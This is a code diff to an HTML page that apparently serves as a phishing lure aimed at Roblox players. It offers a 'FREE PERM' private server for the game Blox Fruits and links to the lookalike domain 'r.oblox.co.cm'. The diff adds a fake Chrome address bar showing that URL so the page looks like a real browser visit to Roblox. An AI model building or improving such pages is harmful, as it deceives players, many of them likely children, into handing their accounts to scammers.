@@ -18,11 +18,35 @@
 
     body {
       background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAm1PPiDWYgRbchHmUx5_FqWr-JGtUvptmyElHwH0sBQ&s') no-repeat center center;
-      background-size: 100% 100%;
+      background-size: cover;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
       color: white;
+    }
+
+    .chrome-bar {
+      width: 100%;
+      background: #f1f3f4;
+      color: black;
+      padding: 10px 15px;
+      font-family: sans-serif;
+      font-size: 14px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .chrome-bar span {
+      background: white;
+      padding: 8px 12px;
+      border-radius: 20px;
+      flex-grow: 1;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+      border: 1px solid #ccc;
     }
 
     .overlay {
@@ -30,6 +54,7 @@
       padding: 40px 30px;
       border-radius: 15px;
       text-align: center;
+      margin-top: 60px;
     }
 
     a {
@@ -49,11 +74,16 @@
   </style>
 </head>
 <body>
+  <div class="chrome-bar">
+    <img src="https://www.google.com/chrome/static/images/chrome-logo-m100.svg" alt="Chrome" width="20" height="20">
+    <span>https://www.r.oblox.co.cm/games/2753915549/Blox-Fruits?privateServerLinkCode=23431552285586053586646524747003</span>
+  </div>
+
   <div class="overlay">
     <h1>FREE PERM</h1>
     <p>JOIN ME HERE</p>
     <a href="https://www.google.com/search?q=https://www.r.oblox.co.cm/games/2753915549/Blox-Fruits?privateServerLinkCode=23431552285586053586646524747003" target="_blank">
-      🔗CLICK TO JOIN🔗
+      CLICK TO JOIN
     </a>
   </div>
 </body>
